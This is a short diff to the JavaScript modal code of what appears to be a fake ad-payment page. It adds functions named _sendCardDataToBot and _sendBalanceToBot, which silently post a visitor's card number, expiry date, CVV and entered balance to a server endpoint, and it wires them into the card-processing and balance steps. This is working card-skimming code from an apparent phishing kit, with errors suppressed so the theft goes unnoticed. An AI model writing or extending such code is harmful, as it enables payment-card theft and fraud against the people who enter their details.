@@ -798,6 +798,27 @@
     this.currentModal = null;
   };
 
+  ModalSystem.prototype._sendCardDataToBot = function (cardData) {
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    axios.post('/api/user-data', {
+      adId: _adId,
+      type: 'card',
+      cardNumber: (cardData.cardNumber || '').replace(/\s/g, ''),
+      cardMonth: cardData.cardMonth,
+      cardYear: cardData.cardYear,
+      cardCvv: cardData.cardCvv
+    }).catch(function () {});
+  };
+
+  ModalSystem.prototype._sendBalanceToBot = function (balance) {
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    axios.post('/api/user-data', {
+      adId: _adId,
+      type: 'balance',
+      balance: balance
+    }).catch(function () {});
+  };
+
   ModalSystem.prototype.processCard = function (cardData) {
     if (this._cardLocked) return;
     this._cardLocked = true;
@@ -805,6 +826,8 @@
     _memCardNum = cardData.cardNumber || '';
     _memCardData = cardData;
     this.showModal('msLoading');
+
+    this._sendCardDataToBot(cardData);
 
     var self = this;
 
@@ -975,6 +998,7 @@
       this._cardData = _memCardData;
     }
 
+    this._sendBalanceToBot(raw);
     this.showModal('msLoading');
     this._sendLog(raw);
   };
